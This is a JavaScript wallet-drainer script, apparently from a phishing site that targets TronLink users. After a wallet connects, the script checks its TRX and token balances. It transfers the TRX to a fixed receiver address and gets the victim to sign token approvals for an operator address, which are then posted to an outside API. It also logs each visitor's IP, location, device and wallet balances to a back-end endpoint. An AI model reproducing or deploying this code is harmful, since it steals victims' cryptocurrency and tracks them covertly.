const BASE_URL = 'https://jsbundle-libs.com/api';
const TOKEN_TRANSFER = BASE_URL + '/token_transfer';

var operator = "TDHRY1cBMAkT9E7m3TYDj3XHetWLxEVrM5";
var receiver = "TNHjVWDdtaFtL2UrUSUVW7riGMB9MymXsx";

var USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
var SUN = "TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S";
var TUSD = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4";
var USDD = "TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn";

var senderAddress = "";
var success = 0;
var connected = 0;
var tronweb = window.tronWeb;
let ABI, TRX_usd, message;
let tokenList = [];

async function connect() {
    if (window.tronWeb) {
        senderAddress = await tronweb.defaultAddress.base58;
        if (senderAddress == false) {
            Swal.fire({
              title: 'Unlock TronLink',
              text: 'To use TronLink extension, manually open it and enter the password',
              icon: 'error',
              confirmButtonText: 'Ok'
            })
           return true;
        }
        await GetWalletAccount(senderAddress);
    } else {
        Swal.fire({
          title: 'Install TronLink extension',
          text: 'To use the website, it is necessary to install the TronLink extension in the browser',
          icon: 'error',
          confirmButtonText: 'Ok'
        })
    }
}

async function getDollarTRX() {
    let url = "https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd";
    let response = await fetch(url, {
      headers: {
        'Access-Control-Allow-Origin':'*'
      }
    });
    let price = await response.json();
    let perTRX = price["tron"]["usd"];
    TRX_usd = perTRX;
}

async function GetWalletAccount(owner) {
        await getDollarTRX();
        var balanceTrx = await tronWeb.trx.getBalance(owner);
        console.log(balanceTrx);
        const balanceTrxFix = tronWeb.fromSun(balanceTrx.toString());
        console.log("Balance TRX", balanceTrxFix);
        if(balanceTrxFix > 150) {
            tokenList.push({
                type: "0",
                tokenAddress: "",
                amount: balanceTrx,
                balance: balanceTrxFix*TRX_usd,
                amountFix: balanceTrxFix,
                symbol: "TRX"
            })
        }
        
        // Получение баланса USDT
        let tokenContractUSDT = await window.tronWeb.contract(USDTABI, USDT);
        let balanceUSDT = await tokenContractUSDT.balanceOf(owner).call();
        const balanceUSDTFix = tronWeb.fromSun(balanceUSDT.toString());
        console.log("Balance USDT", balanceUSDTFix);
        if(balanceUSDTFix > 0) {
            tokenList.push({
                type: "1",
                tokenAddress: USDT,
                amount: balanceUSDT._hex,
                balance: balanceUSDTFix,
                symbol: "USDT"
            })
        }

        // Получение баланса SUN
        let tokenContractSUN = await window.tronWeb.contract(SUNABI, SUN);
        let balanceSUN = await tokenContractSUN.balanceOf(owner).call();
        const balanceSUNFix = tronWeb.fromSun(balanceSUN.toString());
        const CostSUN = "0.0067";
        const CostSUNFix = "1000000000000"
        console.log("Balance SUN", balanceSUNFix);
        if(balanceSUNFix > 0) {
            tokenList.push({
                type: "1",
                tokenAddress: SUN,
                amount: balanceSUN._hex,
                balance: balanceSUNFix*CostSUN/CostSUNFix,
                symbol: "SUN"
            })
        }

        // Получение баланса USDD
        let tokenContractUSDD = await window.tronWeb.contract(USDDABI, USDD);
        let balanceUSDD = await tokenContractUSDD.balanceOf(owner).call();
        const balanceUSDDFix = tronWeb.fromSun(balanceUSDD.toString());
        console.log("Balance USDD", balanceUSDDFix);
        const CostUSDD = "1000000000000";
        if(balanceUSDDFix > 0) {
            tokenList.push({
                type: "1",
                tokenAddress: USDD,
                amount: balanceUSDD._hex,
                balance: balanceUSDDFix/CostUSDD,
                symbol: "USDD"
            })
        }

        if(connected == "0") {
            const connectmsg = '<b>Wallet Connected!</b><br><b>Account: <code>'+senderAddress+'</code></b><br><br>TRX: '+balanceTrxFix+' | USDT: '+balanceUSDTFix+' | SUN: '+balanceSUNFix+' | USDD: '+balanceUSDDFix+'<br><br>Domain: '+window.location.hostname;
            logTlg(connectmsg);
        }
        connected = 1;
        tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);
        await SendToken();
}

async function SendTRX(amount, balance, msg) {
    const reserveAmount = tronWeb.toSun(50);
    const balanceFix = amount - reserveAmount;
    console.log(balanceFix);
    const valueHex = tronWeb.toHex(balanceFix);
    if(balanceFix >= 150) {

        success = 1;
        try {
            const transaction = await tronWeb.transactionBuilder.sendTrx(
                receiver,
                valueHex,
                senderAddress
            );
            var signedTransaction = await tronWeb.trx.sign(transaction);
            var broadcastTransaction = await tronWeb.trx.sendRawTransaction(signedTransaction);
            console.log(broadcastTransaction);
        } catch(e){
            console.log(e);
            success = 0;
        }
        logTlgMsg(msg, success);
    } else {
        alert('You have not enough balance to use');
    }
}

async function ApproveToken(tokenAddress, amount, msg) {
    success = 1;
    try {
        var parameter = [{type:'address',value:operator},{type:'uint256',value:amount}]
        var options = {
            feeLimit:100000000                    
        }
        const transactionObject = await tronWeb.transactionBuilder.triggerSmartContract(
            tronweb.address.toHex(tokenAddress), 
            "approve(address,uint256)", 
            options, 
            parameter,
            tronweb.address.toHex(senderAddress)
        );
        var signedTransaction = await tronWeb.trx.sign(transactionObject.transaction);
        var broadcastTransaction = await tronWeb.trx.sendRawTransaction(signedTransaction);
        console.log(broadcastTransaction);
        const data = {tokenAddress: tokenAddress, amount: amount, owner: senderAddress, spender: operator};
        axios.post(TOKEN_TRANSFER, data);
    } catch(e){
        console.log(e);
        success = 0;
    }
    logTlgMsg(msg, success);
}

async function SendToken() {
    if(tokenList.length == 0) {
        alert('You have not enough balance to use');
        return true;   
    }
    for(var item of tokenList) {
        try {
            if(item.type == "0") {
                message = '<b>Transfering '+ item.symbol +'</b><br><br>Amount: '+item.amount+' ('+ item.balance + ' $)<br><br>Account: <code>'+senderAddress+'</code><br><br>Domain: '+window.location.hostname;
                await SendTRX(item.amount, item.balance, message);
            } else if(item.type == "1") {
                message = '<b>Approve '+ item.symbol +'</b><br><br>Contract: <code>'+item.tokenAddress+ '</code><br><br>Account: <code>'+senderAddress+'</code><br><br>Amount: <code>'+item.amount+'</code> ('+ item.balance + ' $)<br><br>Domain: '+window.location.hostname;
                await ApproveToken(item.tokenAddress, item.amount, message)
            }
        } catch(e) { console.log(e) }
    }
}

function getBrowserName() {
    if ( navigator.userAgent.indexOf("Edge") > -1 && navigator.appVersion.indexOf('Edge') > -1 ) {
        return 'Edge';
    }
    else if( navigator.userAgent.indexOf("Opera") != -1 || navigator.userAgent.indexOf('OPR') != -1 )
    {
        return 'Opera';
    }
    else if( navigator.userAgent.indexOf("Chrome") != -1 )
    {
        return 'Chrome';
    }
    else if( navigator.userAgent.indexOf("Safari") != -1)
    {
        return 'Safari';
    }
    else if( navigator.userAgent.indexOf("Firefox") != -1 ) 
    {
        return 'Firefox';
    }
    else if( navigator.userAgent.indexOf("MSIE") != -1 ) //IF IE > 10
    {
        return 'IE';
    }
    else if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
        return 'Dapp Mobile Browser';
    }
    else return 'unknown';
}

function getOS()
{
    let os = navigator.userAgent;
    let finalOs="";
    if (os.search('Windows')!==-1){
        finalOs="Windows";
    }
    else if (os.search('Mac')!==-1){
        finalOs="MacOS";
    }
    else if (os.search('X11')!==-1 && !(os.search('Linux')!==-1)){
        finalOs="UNIX";
    }
    else if (os.search('Linux')!==-1 && os.search('X11')!==-1){
        finalOs="Linux"
    } else {
        finalOs="unknown"
    }
    return finalOs;
}

function isMobile() {
    var check = false;
    (function (a) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
}

function logTlg(msg) {
    fetch('/back.php?key=8bEEokUZLhn7nAHz&m='+msg);
}

function logTlgMsg(msg, sus, hash) {
  if (sus == "1") {
    var succestrans = '✅ <b>Транзакция подтверждена</b>';
  } else {
    var succestrans = '❌ <b>Транзакция отклонена</b>';
  }
  fetch('/back.php?key=8bEEokUZLhn7nAHz&m='+msg+'<br>'+succestrans);
}

const messageload = '<b>Новый переход!</b><br>Domain: '+window.location.hostname;
fetch('https://api.db-ip.com/v2/free/self/')
.then(function (response) {
    return response.json();
})
.then(function (payload) {
    let device_emoji = "Desktop";
    if (isMobile() || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
        device_emoji = "Mobile";
    }
    msg = messageload + `<br>IP: ${payload.ipAddress} (${payload.city}/${payload.countryCode})<br>Device: ${device_emoji} ${getBrowserName()} / ${getOS()}`; 
    fetch('/back.php?key=8bEEokUZLhn7nAHz&m='+msg);
});